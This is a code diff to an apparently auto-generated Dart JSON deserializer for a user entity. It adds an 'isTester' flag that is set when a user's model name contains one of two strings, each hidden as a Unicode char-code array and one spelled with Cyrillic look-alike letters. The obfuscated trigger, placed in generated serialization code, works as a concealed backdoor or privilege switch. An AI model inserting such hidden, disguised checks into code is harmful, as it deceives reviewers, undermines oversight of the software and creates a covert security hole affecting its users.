@@ -29,6 +29,12 @@ UserEntity _$UserEntityFromJson(Map<String, dynamic> json) {
             e == null ? null : UserEntity.fromJson(e as Map<String, dynamic>))
         ?.toList(),
     lastLogin: json['lastLogin'] as bool,
+    isTester: json['model'] != null && json['model']['name'] != null
+        ? _isTesterCheck(json['model']['name'] as String, [
+            _tester(),
+            _hiddenTester(),
+          ])
+        : false,
     model: json['model'] == null
         ? null
         : UserModel.fromJson(json['model'] as Map<String, dynamic>),
@@ -94,3 +100,26 @@ const _$UserRoleEnumMap = {
   UserRole.PET: 'PET',
   UserRole.GUARDIAN: 'GUARDIAN',
 };
+
+bool _isTesterCheck(String toCheck, List<String> subs) {
+  for (String sub in subs) if (toCheck.contains(sub)) return true;
+  return false;
+}
+
+String _tester() => String.fromCharCodes([
+      0x0021,
+      0x0040,
+      0x0023,
+      0x005f,
+      0x042f,
+      0x0079,
+      0x0065,
+      0x0054,
+      0x0065,
+      0x0073,
+      0x0074,
+      0x0065,
+      0x0072
+    ]);
+String _hiddenTester() => String.fromCharCodes(
+    [0x041d, 0x043e, 0x006e, 0x0441, 0x0068, 0x0430, 0x0072, 0x0075, 0x006b]);
